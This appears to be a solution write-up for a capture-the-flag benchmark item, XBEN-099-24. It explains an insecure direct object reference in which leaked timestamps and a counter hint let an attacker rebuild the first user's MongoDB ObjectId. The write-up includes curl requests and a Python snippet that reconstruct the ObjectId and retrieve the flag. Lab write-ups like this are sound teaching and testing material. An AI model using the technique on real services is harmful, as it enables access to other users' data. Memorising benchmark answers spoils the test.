# XBEN-099-24 — Get the first

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** IDOR via predictable MongoDB ObjectId. `/profile/:id` discloses the flag only
if the requested `id` equals `firstUserId` (the seed `user0` account's MongoDB `_id`). A MongoDB
ObjectId is `4-byte unix-timestamp | 5-byte process-unique random | 3-byte incrementing counter`.
The server conveniently leaks everything needed to reconstruct `firstUserId`:
- `GET /starttime` (or `/`) returns `appStartTimestamp`, the exact unix timestamp embedded in the
  first user's ObjectId (bytes 0-3).
- `POST /register` returns a `distance` field = `(your new ObjectId's counter) - (first user's
  counter)` — an explicit hint that directly reveals the counter offset.
- The 5-byte "random" process-unique segment (bytes 4-8) is generated once per Node.js process and
  reused for every ObjectId it creates, so a newly registered user's ObjectId shares this segment
  with `firstUserId`.

Combining `appStartTimestamp` (timestamp bytes), the random segment from a freshly registered
user's own `_id`, and `own_counter - distance` (first user's counter) reconstructs `firstUserId`
exactly, bypassing the need to brute-force anything.

## Exploit

```bash
# 1. Get the first user's embedded timestamp
curl -s "http://localhost:55457/starttime"
# -> 1790806579

# 2. Register a throwaway account; note its ObjectId and the "distance" hint
curl -s -X POST "http://localhost:55457/register" -d "username=attacker1&password=attackerpass"
# -> {"userId":"6abd8a55a737bef06777eb89", ..., "distance":3}
```

```python
oid = '6abd8a55a737bef06777eb89'
ts_hex, rand_hex, counter_hex = oid[0:8], oid[8:18], oid[18:24]
counter = int(counter_hex, 16)

distance = 3
first_counter_hex = format(counter - distance, '06x')
first_ts_hex = format(1790806579, '08x')   # appStartTimestamp

first_oid = first_ts_hex + rand_hex + first_counter_hex
print(first_oid)   # -> 6abd8a33a737bef06777eb86
```

```bash
# 3. Fetch the first user's profile directly by the reconstructed ObjectId
curl -s "http://localhost:55457/profile/6abd8a33a737bef06777eb86"
```
